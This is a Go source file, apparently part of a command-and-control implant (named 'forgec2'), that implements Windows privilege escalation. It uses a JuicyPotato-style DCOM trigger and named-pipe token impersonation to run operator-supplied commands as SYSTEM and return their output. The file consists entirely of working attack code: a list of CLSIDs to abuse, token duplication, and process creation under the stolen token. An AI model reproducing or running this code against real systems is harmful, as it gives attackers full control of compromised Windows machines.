//go:build windows

package main

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
	procCreateProcessAsUserW       = advapi32.NewProc("CreateProcessAsUserW")
	procOpenThreadToken            = advapi32.NewProc("OpenThreadToken")
	procCreatePipe                 = k32.NewProc("CreatePipe")
	procSetHandleInformation       = k32.NewProc("SetHandleInformation")
	procGetExitCodeProcess         = k32.NewProc("GetExitCodeProcess")
	procReadFile                   = k32.NewProc("ReadFile")
)

var (
	potatoOle32          = syscall.NewLazyDLL("ole32.dll")
	procCoInitializeEx   = potatoOle32.NewProc("CoInitializeEx")
	procCLSIDFromString  = potatoOle32.NewProc("CLSIDFromString")
	procCoCreateInstance = potatoOle32.NewProc("CoCreateInstance")
)

type startupInfoW struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdError       uintptr
}

type processInfo struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessID uint32
	dwThreadID  uint32
}

type securityAttributes struct {
	nLength              uint32
	lpSecurityDescriptor uintptr
	bInheritHandle       uint32
}

type guid struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

var juicyCLSIDs = []string{
	"{854A20FB-2D44-457D-992F-EF13785D2B51}",
	"{FDC3723D-1588-4BA3-92D4-42F74A2391C5}",
	"{6BC8EADD-EA1C-4F8D-ABED-0CA87A504F47}",
	"{000C101C-0000-0000-C000-000000000046}",
	"{F9717507-6657-4F70-8F0A-81A8EACB6CBC}",
}

func handleJuicyPotato(task Task, res *TaskResult) {
	cmd := strings.TrimSpace(task.Command)
	if cmd == "" {
		cmd = "cmd.exe /c whoami"
	}
	out, err := juicyPotato(cmd)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleNamedPipeImpersonate(task Task, res *TaskResult) {
	cmd := strings.TrimSpace(task.Command)
	if cmd == "" {
		cmd = "cmd.exe /c whoami"
	}
	out, err := namedPipeImpersonate(cmd)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func juicyPotato(cmd string) (string, error) {
	pipeName := fmt.Sprintf("forgec2_jp_%08x", rng.Uint32())
	return namedPipeImpersonateWithTrigger(cmd, pipeName, func(pn string) error {
		return triggerDCOM(pn)
	})
}

func namedPipeImpersonate(cmd string) (string, error) {
	pipeName := fmt.Sprintf("forgec2_np_%08x", rng.Uint32())
	return namedPipeImpersonateWithTrigger(cmd, pipeName, nil)
}

func namedPipeImpersonateWithTrigger(cmd, pipeName string, trigger func(string) error) (string, error) {
	sm := getPipeSyscallManager()

	debugLog(fmt.Sprintf("[potato] Creating named pipe \\\\.\\pipe\\%s", pipeName))

	handle, err := syscallNtCreateNamedPipeFile(sm, pipeName, 255)
	if err != nil {
		return "", fmt.Errorf("create pipe: %w", err)
	}
	defer syscallNtCloseHandle(sm, handle)

	errCh := make(chan error, 1)
	go func() {
		errCh <- syscallNtFsControlListen(sm, handle)
	}()

	time.Sleep(200 * time.Millisecond)

	if trigger != nil {
		if tErr := trigger(pipeName); tErr != nil {
			debugLog(fmt.Sprintf("[potato] trigger warning: %v", tErr))
		}
	}

	select {
	case err := <-errCh:
		if err != nil {
			return "", fmt.Errorf("pipe listen: %w", err)
		}
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("timeout waiting for pipe connection (ensure a SYSTEM process connects to \\\\.\\pipe\\%s)", pipeName)
	}

	debugLog("[potato] Client connected, impersonating")

	ret, _, le := procImpersonateNamedPipeClient.Call(handle)
	if ret == 0 {
		return "", fmt.Errorf("ImpersonateNamedPipeClient failed: %v", le)
	}

	currentThread, _, _ := k32.NewProc("GetCurrentThread").Call()
	var hToken uintptr
	ret, _, le = procOpenThreadToken.Call(currentThread, TOKEN_ALL_ACCESS_TOKEN, 0, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		procRevertToSelf.Call()
		return "", fmt.Errorf("OpenThreadToken failed: %v", le)
	}

	tokenUser := getTokenUsername(hToken)
	tokenIntegrity := getTokenIntegrity(hToken)
	debugLog(fmt.Sprintf("[potato] Impersonated: %s (%s)", tokenUser, tokenIntegrity))

	var hPrimary uintptr
	ret, _, le = procDuplicateTokenEx.Call(
		hToken,
		TOKEN_ALL_ACCESS_TOKEN,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&hPrimary)),
	)
	procCloseHandle.Call(hToken)
	if ret == 0 {
		procRevertToSelf.Call()
		return "", fmt.Errorf("DuplicateTokenEx failed: %v", le)
	}
	defer procCloseHandle.Call(hPrimary)
	defer procRevertToSelf.Call()

	return createProcessWithToken(cmd, hPrimary, tokenUser, tokenIntegrity)
}

func createProcessWithToken(cmd string, hToken uintptr, tokenUser, tokenIntegrity string) (string, error) {
	var appName string
	var cmdLine string

	if strings.HasPrefix(cmd, "\"") {
		idx := strings.Index(cmd[1:], "\"")
		if idx >= 0 {
			appName = cmd[1 : idx+1]
			cmdLine = cmd
		} else {
			appName = cmd
			cmdLine = cmd
		}
	} else if strings.Contains(cmd, " ") {
		parts := strings.SplitN(cmd, " ", 2)
		appName = parts[0]
		cmdLine = cmd
	} else {
		appName = cmd
		cmdLine = cmd
	}

	appNamePtr, _ := syscall.UTF16PtrFromString(appName)
	cmdLinePtr, _ := syscall.UTF16PtrFromString(cmdLine)

	var hStdoutRead, hStdoutWrite uintptr
	var sa securityAttributes
	sa.nLength = uint32(unsafe.Sizeof(sa))
	sa.bInheritHandle = 1

	pipeOk := false
	ret, _, le := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&hStdoutRead)),
		uintptr(unsafe.Pointer(&hStdoutWrite)),
		uintptr(unsafe.Pointer(&sa)),
		4096,
	)
	if ret != 0 {
		procSetHandleInformation.Call(hStdoutRead, 1, 0)
		pipeOk = true
	} else {
		debugLog(fmt.Sprintf("[potato] CreatePipe failed: %v", le))
	}

	var si startupInfoW
	si.cb = uint32(unsafe.Sizeof(si))
	si.dwFlags = 0x00000101 // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
	si.wShowWindow = 0
	if pipeOk {
		si.hStdOutput = hStdoutWrite
		si.hStdError = hStdoutWrite
	}
	si.hStdInput = 0

	var pi processInfo

	ret, _, le = procCreateProcessAsUserW.Call(
		hToken,
		uintptr(unsafe.Pointer(appNamePtr)),
		uintptr(unsafe.Pointer(cmdLinePtr)),
		0,
		0,
		0,
		uintptr(createNoWindow),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if pipeOk {
		procCloseHandle.Call(hStdoutWrite)
	}
	if ret == 0 {
		if pipeOk {
			procCloseHandle.Call(hStdoutRead)
		}
		return "", fmt.Errorf("CreateProcessAsUserW failed: %v", le)
	}

	var output string
	if pipeOk {
		output = readProcessOutput(hStdoutRead, pi.hProcess)
	} else {
		output = fmt.Sprintf("(PID %d)", pi.dwProcessID)
	}

	procCloseHandle.Call(pi.hThread)
	procCloseHandle.Call(pi.hProcess)

	result := fmt.Sprintf("Impersonated SYSTEM token (%s) via named pipe, created process PID %d\nUser: %s\nIntegrity: %s\nOutput: %s",
		tokenUser, pi.dwProcessID, tokenUser, tokenIntegrity, strings.TrimSpace(output))

	return result, nil
}

func readProcessOutput(hRead uintptr, hProcess uintptr) string {
	procWaitForSingleObject.Call(hProcess, 5000)

	var buf [4096]byte
	var total int
	for {
		var nread uint32
		ret, _, _ := procReadFile.Call(
			hRead,
			uintptr(unsafe.Pointer(&buf[total])),
			uintptr(len(buf)-total),
			uintptr(unsafe.Pointer(&nread)),
			0,
		)
		if ret == 0 || nread == 0 {
			break
		}
		total += int(nread)
		if total >= len(buf) {
			break
		}
	}
	procCloseHandle.Call(hRead)
	if total == 0 {
		return "(no output)"
	}
	return string(buf[:total])
}

func triggerDCOM(pipeName string) error {
	pipeFullName := `\\.\pipe\` + pipeName

	ret, _, _ := procCoInitializeEx.Call(0, 2)
	_ = ret

	var iid guid
	iidStr, _ := syscall.UTF16PtrFromString("{00000000-0000-0000-C000-000000000046}")
	procCLSIDFromString.Call(
		uintptr(unsafe.Pointer(iidStr)),
		uintptr(unsafe.Pointer(&iid)),
	)

	triggered := false
	for _, clsidStr := range juicyCLSIDs {
		if triggered {
			break
		}

		var clsid guid
		clsidW, _ := syscall.UTF16PtrFromString(clsidStr)
		hr, _, _ := procCLSIDFromString.Call(
			uintptr(unsafe.Pointer(clsidW)),
			uintptr(unsafe.Pointer(&clsid)),
		)
		if hr != 0 {
			continue
		}

		var pUnknown uintptr
		hr, _, _ = procCoCreateInstance.Call(
			uintptr(unsafe.Pointer(&clsid)),
			0,
			4,
			uintptr(unsafe.Pointer(&iid)),
			uintptr(unsafe.Pointer(&pUnknown)),
		)
		if hr == 0 && pUnknown != 0 {
			debugLog(fmt.Sprintf("[potato] DCOM activated CLSID %s", clsidStr))
			vtable := *(*[3]uintptr)(unsafe.Pointer(pUnknown))
			syscall.Syscall(vtable[2], 1, pUnknown, 0, 0)
			triggered = true
			time.Sleep(2 * time.Second)

			break
		}
	}

	if !triggered {
		debugLog("[potato] No DCOM CLSID activated, falling back to waiting for any connection")
		return fmt.Errorf("DCOM activation failed for all CLSIDs, waiting for manual connection to %s", pipeFullName)
	}

	return nil
}
